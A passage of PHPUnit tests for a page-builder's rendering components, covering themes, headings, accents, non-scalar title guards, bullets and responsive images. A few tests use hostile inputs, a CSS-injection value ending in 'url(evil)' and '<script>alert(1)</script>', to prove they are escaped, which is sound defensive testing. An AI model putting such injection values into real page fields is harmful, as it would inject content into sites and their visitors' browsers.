        $html = $this->render('faq', $this->faqProps());
        $this->assertStringContainsString('class="faq"', $html);
        $this->assertStringNotContainsString('faq--', $html);
    }

    public function testFaqUnknownThemeClampsToDefault(): void
    {
        // The write path rejects an unadvertised enum value outright (#579 strict
        // enums), so this pins the RENDER-side contract for bytes already in storage:
        // an unknown theme must not emit an unstyled faq--<garbage> class.
        $html = $this->render('faq', $this->faqProps(['theme' => 'neon']));
        $this->assertStringNotContainsString('faq--neon', $html);
        $this->assertStringContainsString('class="faq"', $html);
    }

    // ── theme `muted` emits the legacy `--dark` class (#570 DG-4, render layer) ──
    // The canonical value `muted` emits the legacy `--dark` surface-band class. That
    // is an OUTPUT NAME the #605 input-alias removal deliberately kept, so these are
    // the DG-4 regression proof: they must stay green, unchanged, forever. Proven at
    // the render layer (not just the helper) so the template wiring is pinned.

    public function testFaqMutedThemeEmitsLegacyDarkClass(): void
    {
        $html = $this->render('faq', $this->faqProps(['theme' => 'muted']));
        $this->assertStringContainsString('class="faq faq--dark"', $html);
    }

    public function testGridMutedThemeEmitsLegacyDarkClass(): void
    {
        $muted = $this->render('grid', ['theme' => 'muted', 'items' => [['title' => 'One', 'text' => 'a']]]);
        $this->assertStringContainsString('grid--dark', $muted);
    }

    public function testGridStoredLegacyDarkRendersTheDefaultBandNotMuted(): void
    {
        // #605 at the RENDER layer, on the stored-bytes route: a band still holding
        // the removed input value paints the DEFAULT band. Pinned as the deliberate
        // breakage, and as proof the removal did not quietly re-alias it to muted.
        $stale = $this->render('grid', ['theme' => 'dark', 'items' => [['title' => 'One', 'text' => 'a']]]);
        $this->assertStringNotContainsString('grid--dark', $stale);
        $this->assertStringNotContainsString('grid--', $stale);
    }

    public function testCtaMutedEmitsDarkAndInvertedStaysInverted(): void
    {
        $base     = ['title' => 'Go', 'button_text' => 'Click', 'button_url' => '/'];
        $muted    = $this->render('cta', $base + ['theme' => 'muted']);
        $inverted = $this->render('cta', $base + ['theme' => 'inverted']);
        $this->assertStringContainsString('cta--dark', $muted);
        $this->assertStringContainsString('cta--inverted', $inverted);
        $this->assertStringNotContainsString('cta--dark', $inverted);
    }

    public function testStatsRendersAllFourSlots(): void
    {
        $overrides = [
            '--stats-bg' => 'radial-gradient(#fff, #000)',
            '--stats-heading-color' => '#111111',
            '--stats-number-color' => '#ea3900',
            '--stats-label-color' => '#666666',
        ];
        $html = $this->render('stats', array_merge($this->statsProps(), ['__pp_style' => $overrides]));
        foreach ($overrides as $slot => $value) {
            $this->assertStringContainsString("{$slot}: {$value}", $html, "{$slot} did not render.");
        }
    }

    public function testStatsStyleSlotMergesWithBackgroundImage(): void
    {
        // stats.php's __pp_style rendering must coexist with the pre-existing
        // background_image inline-style mechanism (same pattern as hero/section).
        $html = $this->render('stats', array_merge($this->statsProps(), [
            '__pp_style' => ['--stats-number-color' => '#ea3900'],
            'background_image' => 'https://example.com/bg.jpg',
        ]));
        $this->assertStringContainsString('--stats-number-color: #ea3900', $html);
        $this->assertStringContainsString('background-image:url(', $html);
    }

    public function testStatsRejectsInjectionInStyleSlot(): void
    {
        $html = $this->render('stats', array_merge($this->statsProps(), [
            '__pp_style' => ['--stats-heading-color' => '#fff; background:url(evil)'],
        ]));
        $this->assertStringNotContainsString('url(evil)', $html);
    }

    // ── End-to-end: exact production regression from #36 ────────────────────

    public function testHeroSplitVariantRendersDataUriSvgImageSrc(): void
    {
        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>';
        $html = $this->render('hero', [
            'title' => 'Welcome',
            'layout' => 'split',
            'image_url' => $svg,
        ]);
        $this->assertStringNotContainsString('src=""', $html, 'The exact #36 production regression: src="" instead of the data URI.');
        $this->assertMatchesRegularExpression('/src="data:image\/svg\+xml,[^"]*"/', $html);
    }

    public function testHeroCoverVariantRendersDataUriSvgBackgroundImage(): void
    {
        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>';
        $html = $this->render('hero', [
            'title' => 'Welcome',
            'layout' => 'cover',
            'image_url' => $svg,
        ]);
        $this->assertStringContainsString('background-image:url(data:image/svg+xml,', $html);
        $this->assertStringNotContainsString('background-image:url();', $html);
    }

    // ── Section-header pattern: eyebrow + subheading + alignment (#102/#85) ──

    private function gridProps(array $extra = []): array
    {
        return array_merge(['items' => [['title' => 'Item', 'text' => 'Text']]], $extra);
    }

    private function sectionProps(array $extra = []): array
    {
        return array_merge(['body' => '<p>Body</p>'], $extra);
    }

    public function testHeroEyebrowRenders(): void
    {
        // Regression pin for #85: hero's eyebrow prop now actually renders.
        $html = $this->render('hero', ['title' => 'T', 'eyebrow' => 'NEW']);
        $this->assertStringContainsString('class="hero__eyebrow"', $html);
        $this->assertStringContainsString('>NEW<', $html);
    }

    public function testHeroEyebrowOmittedWhenUnset(): void
    {
        $html = $this->render('hero', ['title' => 'T']);
        $this->assertStringNotContainsString('hero__eyebrow', $html);
    }

    /**
     * Regression pin for #225: the pill only holds because the eyebrow is a direct
     * flex item of .hero__content and the CSS gives it align-self. Wrapping it in
     * any intermediate element would leave the CSS pins green while the eyebrow
     * silently went back to stretching across the full hero content width.
     */
    public function testHeroEyebrowIsDirectChildOfHeroContent(): void
    {
        foreach (['left', 'centered', 'split', 'cover'] as $layout) {
            $html = $this->render('hero', [
                'title'   => 'T',
                'eyebrow' => 'NEW',
                'layout'  => $layout,
            ]);
            // No element of ANY kind may open between the two tags — a <span> or <p>
            // wrapper destroys the flex-item relationship just as surely as a <div>,
            // and would leave every CSS pin green. Position within hero__content, and
            // any attributes it grows, stay free: direct childhood is the whole contract.
            $this->assertMatchesRegularExpression(
                '/<div class="hero__content"[^>]*>(?:(?!<[a-zA-Z])[\s\S])*?<span class="hero__eyebrow"/',
                $html,
                "hero__eyebrow must be a direct child of hero__content (layout: {$layout})"
            );
        }
    }

    /**
     * Regression pin for #224: the desktop column count is selected in CSS off
     * data-pp-count, so the attribute is a contract, not a detail. Without this
     * pin, dropping or renaming it would leave the CSS pins green while 3-item
     * grids silently fell back to two columns and orphaned the third card.
     */
    public function testGridEmitsItemCountAttribute(): void
    {
        $items = [
            ['title' => 'One',   'text' => 'A'],
            ['title' => 'Two',   'text' => 'B'],
            ['title' => 'Three', 'text' => 'C'],
        ];

        $html = $this->render('grid', ['items' => $items]);
        $this->assertStringContainsString('data-pp-count="3"', $html);

        $html = $this->render('grid', ['items' => array_slice($items, 0, 2)]);
        $this->assertStringContainsString('data-pp-count="2"', $html);

        // #297: a single-item grid must emit count="1" so the CSS count-1 rule
        // (full-width track) can match it, instead of falling through to the
        // two-column base and stranding the lone card in the left column.
        $html = $this->render('grid', ['items' => array_slice($items, 0, 1)]);
        $this->assertStringContainsString('data-pp-count="1"', $html);
    }

    public function testGridEyebrowSubheadingAndCenterAlignRender(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'title' => 'Heading',
            'eyebrow' => 'KICKER',
            'subheading' => 'Supporting line',
            'title_align' => 'center',
        ]));
        $this->assertStringContainsString('class="grid__header grid__header--center"', $html);
        $this->assertStringContainsString('class="grid__eyebrow">KICKER<', $html);
        $this->assertStringContainsString('class="grid__heading">Heading<', $html);
        $this->assertStringContainsString('class="grid__subheading">Supporting line<', $html);
    }

    public function testGridHeaderAlignDefaultsToStartAndOmitsCenterClass(): void
    {
        $html = $this->render('grid', $this->gridProps(['title' => 'Heading']));
        $this->assertStringContainsString('class="grid__header">', $html);
        $this->assertStringNotContainsString('grid__header--center', $html);
    }

    public function testGridHeaderAlignInvalidFallsBackToStart(): void
    {
        $html = $this->render('grid', $this->gridProps(['title' => 'Heading', 'title_align' => 'end']));
        $this->assertStringNotContainsString('grid__header--center', $html);
    }

    public function testGridHeaderOmittedWhenNoTitleEyebrowOrSubheading(): void
    {
        $html = $this->render('grid', $this->gridProps());
        $this->assertStringNotContainsString('grid__header', $html);
    }

    public function testSectionEyebrowSubheadingAndCenterAlignRenderTextOnly(): void
    {
        $html = $this->render('section', $this->sectionProps([
            'title' => 'Heading',
            'eyebrow' => 'KICKER',
            'subheading' => 'Supporting line',
            'title_align' => 'center',
        ]));
        $this->assertStringContainsString('class="section__header section__header--center"', $html);
        $this->assertStringContainsString('class="section__eyebrow">KICKER<', $html);
        $this->assertStringContainsString('class="section__subheading">Supporting line<', $html);
    }

    public function testSectionEyebrowRendersInImageLayout(): void
    {
        // The image-left/image-right layout has a SEPARATE title block in
        // section.php — must also carry the header pattern, not just text-only.
        $html = $this->render('section', $this->sectionProps([
            'title' => 'Heading',
            'eyebrow' => 'KICKER',
            'layout' => 'image-left',
            'image_url' => 'https://example.com/img.jpg',
        ]));
        $this->assertStringContainsString('class="section__eyebrow">KICKER<', $html);
    }

    public function testCtaEyebrowRenders(): void
    {
        $html = $this->render('cta', $this->ctaProps(['eyebrow' => 'KICKER']));
        $this->assertStringContainsString('class="cta__eyebrow">KICKER<', $html);
    }

    public function testCtaEyebrowOmittedWhenUnset(): void
    {
        $html = $this->render('cta', $this->ctaProps());
        $this->assertStringNotContainsString('cta__eyebrow', $html);
    }

    /**
     * Regression pin for #255: the pill only holds because `display: contents` on
     * .cta__text dissolves that box and promotes the eyebrow into the .cta__inner
     * grid, where the CSS places it in row 1. display:contents only dissolves the ONE
     * box it is set on — wrapping the eyebrow in any intermediate element leaves it
     * inside a box that is still there, so it stops being a grid item, the placement
     * rules stop applying, and every CSS pin stays green while the render changes.
     */
    public function testCtaEyebrowIsDirectChildOfCtaText(): void
    {
        foreach (['full-width', 'inline'] as $layout) {
            $html = $this->render('cta', $this->ctaProps([
                'eyebrow' => 'NEW',
                'layout'  => $layout,
            ]));
            // No element of ANY kind may open between the two tags. Attributes and
            // whitespace stay free: direct childhood is the whole contract.
            $this->assertMatchesRegularExpression(
                '/<div class="cta__text"[^>]*>(?:(?!<[a-zA-Z])[\s\S])*?<span class="cta__eyebrow"/',
                $html,
                "cta__eyebrow must be a direct child of cta__text (layout: {$layout})"
            );
        }
    }

    public function testHeroSchemaDeclaresEyebrowSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/hero/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $this->assertArrayHasKey('--hero-eyebrow-color', $slots);
        $this->assertArrayHasKey('--hero-eyebrow-bg', $slots);
    }

    public function testGridSchemaDeclaresHeaderSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/grid/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        foreach (['--grid-eyebrow-color', '--grid-eyebrow-bg', '--grid-subheading-color'] as $name) {
            $this->assertArrayHasKey($name, $slots, "grid must declare {$name}.");
        }
    }

    public function testSectionSchemaDeclaresHeaderSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/section/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        foreach (['--section-eyebrow-color', '--section-eyebrow-bg', '--section-subheading-color'] as $name) {
            $this->assertArrayHasKey($name, $slots, "section must declare {$name}.");
        }
    }

    public function testCtaSchemaDeclaresEyebrowSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/cta/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $this->assertArrayHasKey('--cta-eyebrow-color', $slots);
        $this->assertArrayHasKey('--cta-eyebrow-bg', $slots);
    }

    public function testGridEyebrowRejectsInjectionInStyleSlot(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'title' => 'H',
            'eyebrow' => 'KICKER',
            '__pp_style' => ['--grid-eyebrow-color' => '#fff; background:url(evil)'],
        ]));
        $this->assertStringNotContainsString('url(evil)', $html);
    }

    // ── pp_render_heading_with_accent() + title_accent (#110) ────────────────
    // Structured, plain-text mechanism — NOT an HTML/markup allowlist. Both
    // $title and $accent are ordinary text; this only decides where to split
    // them. No new markup-parsing surface, so these tests focus on: correct
    // splitting, safe fallback when the accent doesn't actually match, and
    // that every fragment is still escaped exactly like a plain title always was.

    public function testRenderHeadingWithAccentSplitsCorrectly(): void
    {
        $html = pp_render_heading_with_accent('Seguridad y salud para tu WordPress', 'Seguridad', 'hero__title-accent');
        $this->assertSame(
            '<span class="hero__title-accent">Seguridad</span> y salud para tu WordPress',
            $html
        );
    }

    public function testRenderHeadingWithAccentMatchesFirstOccurrenceOnly(): void
    {
        $html = pp_render_heading_with_accent('go go go', 'go', 'x');
        $this->assertSame('<span class="x">go</span> go go', $html);
    }

    public function testRenderHeadingWithAccentFallsBackWhenNoMatch(): void
    {
        $html = pp_render_heading_with_accent('Plain title', 'not-present', 'x');
        $this->assertSame('Plain title', $html);
    }

    public function testRenderHeadingWithAccentFallsBackWhenEmpty(): void
    {
        $html = pp_render_heading_with_accent('Plain title', '', 'x');
        $this->assertSame('Plain title', $html);
    }

    public function testRenderHeadingWithAccentEscapesBothFragments(): void
    {
        // Confirms zero new markup-parsing surface: an attempted HTML/script
        // injection in EITHER the title or the accent substring is escaped
        // exactly as a plain esc_html() title always was.
        $html = pp_render_heading_with_accent('<script>alert(1)</script>', '<script>', 'x');
        $this->assertStringNotContainsString('<script>', $html);
        $this->assertStringContainsString('&lt;script&gt;', $html);
    }

    public function testRenderHeadingWithAccentIsCaseSensitiveExactMatch(): void
    {
        // A case-mismatched "accent" is not a real substring match — falls
        // back to plain title, matching the documented "must match exactly"
        // contract rather than doing a fuzzy/case-insensitive search.
        $html = pp_render_heading_with_accent('Seguridad y salud', 'seguridad', 'x');
        $this->assertSame('Seguridad y salud', $html);
    }

    public function testHeroTitleAccentRenders(): void
    {
        $html = $this->render('hero', ['title' => 'Seguridad y salud', 'title_accent' => 'Seguridad']);
        $this->assertStringContainsString('<span class="hero__title-accent">Seguridad</span> y salud', $html);
    }

    public function testHeroTitleAccentOmittedWhenNoMatch(): void
    {
        $html = $this->render('hero', ['title' => 'Seguridad y salud', 'title_accent' => 'xyz']);
        $this->assertStringNotContainsString('hero__title-accent', $html);
        $this->assertStringContainsString('Seguridad y salud', $html);
    }

    public function testGridTitleAccentRenders(): void
    {
        $html = $this->render('grid', $this->gridProps(['title' => 'Fast and Safe', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="grid__heading-accent">Fast</span> and Safe', $html);
    }

    public function testSectionTitleAccentRendersInBothLayouts(): void
    {
        $textOnly = $this->render('section', $this->sectionProps(['title' => 'Fast and Safe', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="section__title-accent">Fast</span> and Safe', $textOnly);

        $imageLayout = $this->render('section', $this->sectionProps([
            'title' => 'Fast and Safe',
            'title_accent' => 'Fast',
            'layout' => 'image-left',
            'image_url' => 'https://example.com/img.jpg',
        ]));
        $this->assertStringContainsString('<span class="section__title-accent">Fast</span> and Safe', $imageLayout);
    }

    public function testCtaTitleAccentRenders(): void
    {
        $html = $this->render('cta', $this->ctaProps(['title' => 'Fast and Safe', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="cta__title-accent">Fast</span> and Safe', $html);
    }

    public function testFaqTitleAccentRenders(): void
    {
        $html = $this->render('faq', $this->faqProps(['title' => 'Fast Answers', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="faq__heading-accent">Fast</span> Answers', $html);
    }

    public function testStatsTitleAccentRenders(): void
    {
        $html = $this->render('stats', $this->statsProps(['title' => 'Fast Results', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="stats__heading-accent">Fast</span> Results', $html);
    }

    // ── #706: the title/title_accent guard, at the renderer level ────────────
    //
    // The stored-bytes half lives in tests/StoredTitleRenderGuardTest.php, which proves a
    // malformed value can REACH these components through real post meta. What belongs
    // HERE is the per-component and per-value sweep: every one of the seven components
    // that calls pp_render_heading_with_accent(), and every scalar the (string) cast can
    // produce. Split that way so a single component regressing names itself, instead of
    // failing inside one large stored-composition assertion.
    //
    // Asserted AFFIRMATIVELY, never by absence of a fatal: phpunit.xml sets
    // failOnWarning="false" and esc_html() renders a stored array as the literal string
    // `Array` plus an E_WARNING, so "nothing threw" would also pass against an
    // implementation that printed `Array` as the heading.

    /**
     * Each GATED heading call site, paired with the props it needs to render and the BEM
     * class its heading carries.
     *
     * hero is deliberately ABSENT: its call is unconditional, so it degrades to an empty
     * `<h1>` rather than to no heading, and it is pinned by its own
     * testANonScalarHeroTitleDegradesToAnEmptyHeading() below.
     *
     * section appears THREE times, once per layout branch, because it reaches the helper
     * from three independently editable places — `text-only`/`centered` share one, and
     * `text-panel` and `image-left`/`image-right` each have their own. One guarded read
     * feeds all three TODAY, which is exactly why a single fixture is not enough: a
     * regression that reassigns the raw value inside one branch leaves the other two
     * green. Rendering each branch means the failing one names itself.
     */
    public static function headingComponents(): array
    {
        return [
            'grid'                 => ['grid',         ['items' => [['title' => 'Item', 'text' => 'Text']]],   'grid__heading'],
            'section text-only'    => ['section',      ['body' => '<p>Body</p>', 'layout' => 'text-only'],      'section__title'],
            'section centered'     => ['section',      ['body' => '<p>Body</p>', 'layout' => 'centered'],       'section__title'],
            'section text-panel'   => ['section',      ['body' => '<p>Body</p>', 'layout' => 'text-panel', 'panel_heading' => 'Panel'], 'section__title'],
            'section image-left'   => ['section',      ['body' => '<p>Body</p>', 'layout' => 'image-left',  'image_url' => 'https://example.com/a.jpg'], 'section__title'],
            'section image-right'  => ['section',      ['body' => '<p>Body</p>', 'layout' => 'image-right', 'image_url' => 'https://example.com/b.jpg'], 'section__title'],
            'cta'                  => ['cta',          ['button_text' => 'Go', 'button_url' => '#'],           'cta__title'],
            'stats'                => ['stats',        ['items' => [['number' => '40+', 'label' => 'Years']]], 'stats__heading'],
            'faq'                  => ['faq',          ['items' => [['question' => 'Q?', 'answer' => 'A.']]],  'faq__heading'],
            'testimonials'         => ['testimonials', ['items' => [['quote' => 'Great product.']]],           'testimonials__heading'],
        ];
    }

    /**
     * A non-scalar title degrades to NO HEADING in each of the six gated components.
     *
     * @dataProvider headingComponents
     */
    public function testANonScalarTitleRendersNoHeading(string $component, array $props, string $headingClass): void
    {
        $html = $this->render($component, array_merge($props, ['title' => ['en' => 'Our services']]));

        $this->assertStringNotContainsString($headingClass, $html, "{$component}: the heading is skipped entirely");
        $this->assertStringNotContainsString('Array', $html, "{$component}: degraded, never coerced into the page");
    }

    /**
     * A non-scalar title_accent degrades to NO ACCENT while the good title still renders.
     * Argument #2 of the helper is typed too, and it fatals on its own — the filed issue
     * reported this for hero alone; it is all seven.
     *
     * @dataProvider headingComponents
     */
    public function testANonScalarTitleAccentStillRendersThePlainTitle(string $component, array $props, string $headingClass): void
    {
        $html = $this->render($component, array_merge($props, [
            'title'        => 'Our services',
            'title_accent' => ['en' => 'Our'],
        ]));

        $this->assertStringContainsString($headingClass, $html, "{$component}: the heading still renders");
        $this->assertStringContainsString('Our services', $html, "{$component}: with its full title");
        $this->assertStringNotContainsString($headingClass . '-accent', $html, "{$component}: and no accent span");
        $this->assertStringNotContainsString('Array', $html, "{$component}: degraded, never coerced into the page");
    }

    /**
     * hero is the ONE ungated call site, so its degradation differs and is pinned on its
     * own. The `<h1>` renders unconditionally, so a guarded-away title leaves the element
     * behind, empty — which is exactly what a stored empty-string title has always
     * produced. Recorded, not endorsed: corrupt data still leaves an empty page heading in
     * the accessibility tree. Closing that means changing hero's markup contract, which
     * needs its own ruling rather than a rider on this guard (see components/hero/hero.php).
     */
    public function testANonScalarHeroTitleDegradesToAnEmptyHeading(): void
    {
        $html = $this->render('hero', ['title' => ['en' => 'Welcome']]);

        $this->assertStringContainsString('<h1 class="hero__title"></h1>', $html, 'the element survives, empty');
        $this->assertStringNotContainsString('Array', $html, 'degraded, never coerced into the page');
        $this->assertStringNotContainsString('hero__title-accent', $html);
    }

    /**
     * THE PREDICATE PIN, and the reason it is is_scalar and not is_string.
     *
     * PHP runs coercive here, so a non-string SCALAR title never fataled — it coerced at
     * the typed boundary and rendered. The write path is scalar-permissive to match
     * (create_page accepts a scalar title and stores it raw, #707), so an is_string()
     * guard would silently drop a heading the front door had just admitted. This table is
     * the whole cast surface, measured rather than assumed, and it fails the moment the
     * predicate narrows.
     *
     * It is also where "zero rendering change for well-formed data" is actually earned.
     * The guard moves WHERE coercion happens — from inside the typed call to before the
     * `if ($title)` gate — so the question is not whether the cast changes the string (it
     * cannot) but whether it changes the GATE. Every row below agrees with the pre-guard
     * behaviour, because PHP's '0' is itself falsy. The single exception is float negative
     * zero, which has its own test below.
     */
    public static function scalarTitles(): array
    {
        return [
            'int'            => [42,    '42'],
            'float'          => [3.14,  '3.14'],
            'true'           => [true,  '1'],
            'numeric string' => ['7',   '7'],
            // Falsy scalars: the gate stays shut, exactly as before the guard.
            'false'          => [false, null],
            'zero int'       => [0,     null],
            'zero string'    => ['0',   null],
            'empty string'   => ['',    null],
        ];
    }

    /**
     * @dataProvider scalarTitles
     */
    public function testScalarTitlesRenderExactlyAsTheyDidBeforeTheGuard($stored, ?string $expected): void
    {
        $html = $this->render('stats', ['title' => $stored, 'items' => [['number' => '1', 'label' => 'L']]]);

        if ($expected === null) {
            $this->assertStringNotContainsString('stats__heading', $html, 'a falsy scalar renders no heading');
            return;
        }
        $this->assertStringContainsString('<h2 class="stats__heading">' . $expected . '</h2>', $html);
    }

    /**
     * FLOAT NEGATIVE ZERO is the one scalar where the cast flips a truthiness gate:
     * -0.0 is falsy, but (string) -0.0 is '-0', and only '' and '0' are falsy strings. So
     * a gated component starts rendering a heading reading "-0" where it previously
     * rendered none.
     *
     * Left alone deliberately, matching the landed #705 decision: '-0' is inert once
     * escaped, and special-casing it would mean inspecting and rewriting the stored value,
     * which is exactly what the D-B ruling forbids. Pinned so the change is recorded
     * rather than discovered. Whether stored bytes can actually DELIVER a float -0.0 is a
     * separate, channel-dependent question, measured in
     * StoredTitleRenderGuardTest::testNegativeZeroFlipsTheGateOnlyThroughARawMetaWrite.
     *
     * hero is asserted alongside because it is IMMUNE — no gate, so it rendered '-0'
     * before the guard and renders '-0' after. The flip belongs to the gate, not the cast.
     */
    public function testNegativeZeroIsTheOneScalarThatFlipsTheHeadingGate(): void
    {
        $gated = $this->render('stats', ['title' => -0.0, 'items' => [['number' => '1', 'label' => 'L']]]);
        $this->assertStringContainsString('<h2 class="stats__heading">-0</h2>', $gated, 'the gated component now renders a heading it used to skip');

        $ungated = $this->render('hero', ['title' => -0.0]);
        $this->assertStringContainsString('<h1 class="hero__title">-0</h1>', $ungated, 'hero is unaffected: it always coerced and rendered');
    }

    /**
     * THE HEADER WRAPPERS GO TOO, which is the consequence of guarding at the READ rather
     * than at the call. In grid, section and testimonials `$title` also feeds the
     * `__header` wrapper gate, and the read sits upstream of it — so a band whose only
     * header content was a malformed title emits no wrapper at all, instead of an empty
     * one framing a heading that is not there.
     *
     * This is the assertion that would fail if someone "simplified" the fix by widening
     * pp_render_heading_with_accent() to accept mixed: a stored array is TRUTHY, so the
     * wrapper gate would open and the band would emit an empty heading inside it.
     */
    public function testGuardingAtTheReadAlsoClosesTheHeaderWrapperGates(): void
    {
        $cases = [
            'grid'         => [['items' => [['title' => 'Item', 'text' => 'Text']]],   'grid__header'],
            'testimonials' => [['items' => [['quote' => 'Great product.']]],           'testimonials__header'],
            'section'      => [['body' => '<p>Body</p>'],                              'section__header'],
        ];

        foreach ($cases as $component => [$props, $wrapperClass]) {
            $html = $this->render($component, array_merge($props, ['title' => ['en' => 'Our services']]));
            $this->assertStringNotContainsString($wrapperClass, $html, "{$component}: no header wrapper for a heading that is not there");
        }
    }

    public function testAllSixComponentsDeclareTitleAccentSlot(): void
    {
        $expected = [
            'hero'    => '--hero-heading-accent-color',
            'grid'    => '--grid-heading-accent-color',
            'section' => '--section-heading-accent-color',
            'cta'     => '--cta-heading-accent-color',
            'faq'     => '--faq-heading-accent-color',
            'stats'   => '--stats-heading-accent-color',
        ];
        foreach ($expected as $component => $slot) {
            $schema = json_decode(file_get_contents(dirname(__DIR__) . "/components/{$component}/schema.json"), true);
            $this->assertArrayHasKey('title_accent', $schema['props'], "{$component} must declare title_accent prop.");
            $this->assertArrayHasKey($slot, $schema['styling']['style_slots'], "{$component} must declare {$slot}.");
            $this->assertSame('color', $schema['styling']['style_slots'][$slot]['type']);
        }
    }

    // ── Grid card checklist bullets (#103) ──────────────────────────────

    public function testGridCardBulletsRenderAsList(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [[
                'title' => 'Security',
                'bullets' => ['HTTP security headers', 'SSL/TLS validity', 'Clickjacking protection'],
            ]],
        ]));
        $this->assertStringContainsString('<ul class="grid__item-bullets">', $html);
        $this->assertStringContainsString('<li class="grid__item-bullet">HTTP security headers</li>', $html);
        $this->assertStringContainsString('<li class="grid__item-bullet">SSL/TLS validity</li>', $html);
        $this->assertStringContainsString('<li class="grid__item-bullet">Clickjacking protection</li>', $html);
    }

    public function testGridCardBulletsOmittedWhenUnset(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [['title' => 'Security', 'text' => 'Plain description']],
        ]));
        $this->assertStringNotContainsString('grid__item-bullets', $html);
    }

    public function testGridCardBulletsCoexistWithText(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [[
                'title' => 'Security',
                'text' => 'Plain description',
                'bullets' => ['One item'],
            ]],
        ]));
        $this->assertStringContainsString('class="grid__item-text">Plain description<', $html);
        $this->assertStringContainsString('<li class="grid__item-bullet">One item</li>', $html);
    }

    public function testGridCardBulletsSkipNonStringAndEmptyEntries(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [[
                'title' => 'Security',
                'bullets' => ['Valid line', '', 123, ['nested' => 'array'], null],
            ]],
        ]));
        $this->assertStringContainsString('<li class="grid__item-bullet">Valid line</li>', $html);
        $this->assertSame(1, substr_count($html, 'grid__item-bullet"'));
    }

    public function testGridCardBulletsIgnoredWhenNotAnArray(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [['title' => 'Security', 'bullets' => 'not an array']],
        ]));
        $this->assertStringNotContainsString('grid__item-bullets', $html);
    }

    public function testGridCardBulletsEscapeEachLine(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [[
                'title' => 'Security',
                'bullets' => ['<script>alert(1)</script>'],
            ]],
        ]));
        $this->assertStringNotContainsString('<script>alert(1)</script>', $html);
        $this->assertStringContainsString('&lt;script&gt;alert(1)&lt;/script&gt;', $html);
    }

    public function testGridSchemaDeclaresBulletColorSlot(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/grid/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $this->assertArrayHasKey('--grid-item-bullet-color', $slots);
        $this->assertSame('color', $slots['--grid-item-bullet-color']['type']);
    }

    public function testGridSchemaDeclaresStepTextColorSlot(): void
    {
        // #473: the step numeral color is its own slot (default var(--color-bg) so
        // unset is byte-identical), separate from --grid-step-bg (the fill), so a
        // light-fill steps badge can pair a light fill with ink numerals.
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/grid/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $this->assertArrayHasKey('--grid-step-text-color', $slots);
        $this->assertSame('color', $slots['--grid-step-text-color']['type']);
        $this->assertSame('var(--color-bg)', $slots['--grid-step-text-color']['default']);
        $this->assertTrue($slots['--grid-step-text-color']['item_eligible'], 'The numeral color is consumed on the .grid__step-number child of .grid__item, so it is card-scoped like --grid-step-bg.');
    }

    // ── Testimonials component (#1) ─────────────────────────────────────

    // ── #584 A-42: responsive images on grid + testimonials items ────────────
    //
    // Of the five surfaces that render an author-supplied image, three already routed
    // pp_render_responsive_image() (hero, section, logos items) and two emitted a raw
    // fixed-size <img> — a card banner and an author avatar, both real content images on
    // every page that uses them. These pins take the family to 5/5 and hold BOTH branches,
    // because the fallback is the half that must not change: an item without a resolvable
    // image_id has to render exactly today's single-source <img>.
    //
    // The rendered box is unchanged either way (same src, same class, same object-fit, same
    // loading), so this is recorded as a MECHANISM change, not a render change. What DOES
    // change is the emitted HTML when the id resolves: srcset/sizes arrive.

    /** attachment_id => url, the map the wp_get_attachment_image() stub resolves against. */
    private function seedAttachment(int $id, string $url): void
    {
        $GLOBALS['_pp_test_store']['attachment_urls'][$id] = $url;
    }

    public function testGridItemImageIdRendersResponsiveMarkup(): void
    {
        $this->seedAttachment(42, 'https://example.com/uploads/card.jpg');
        $html = $this->render('grid', $this->gridProps([
            'items' => [[
                'title'     => 'Card',
                'image_url' => 'https://example.com/fallback.jpg',
                'image_alt' => 'A card banner',
                'image_id'  => 42,
            ]],
        ]));

        // Resolved: srcset/sizes from wp_get_attachment_image(), and the attachment's own
        // URL replaces the fallback source.
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('sizes=', $html);
        $this->assertStringContainsString('https://example.com/uploads/card.jpg', $html);
        $this->assertStringNotContainsString('https://example.com/fallback.jpg', $html);
        // The box the CSS keys on is untouched — the whole basis for "visually identical".
        $this->assertStringContainsString('class="grid__item-image"', $html);
        $this->assertStringContainsString('grid__item-image-wrap', $html);
        $this->assertStringContainsString('alt="A card banner"', $html);
        $this->assertStringContainsString('loading="lazy"', $html);
    }

    public function testGridItemWithoutResolvableImageIdKeepsTheSingleSourceImg(): void
    {
        // Attachment 1 is seeded on purpose: it is what a bare `(int)` cast resolves a
        // non-scalar image_id to, so if the is_numeric() guard is ever removed these
        // cases render THIS url instead of falling back, and the assertions below fail.
        $this->seedAttachment(1, 'https://example.com/uploads/FIRST-UPLOAD.jpg');
        // Three ways to land on the fallback, all of which must render identically:
        // absent id, id 0, and an id no attachment resolves (a deleted attachment).
        // Every one of these is REACHABLE. #614 closed the WRITE path — a non-numeric
        // image_id is now rejected with invalid_prop_value — but the validator gates
        // writes, not storage: a composition authored before that rule still carries the
        // value, and restore_composition reports without blocking (#233), so all of these
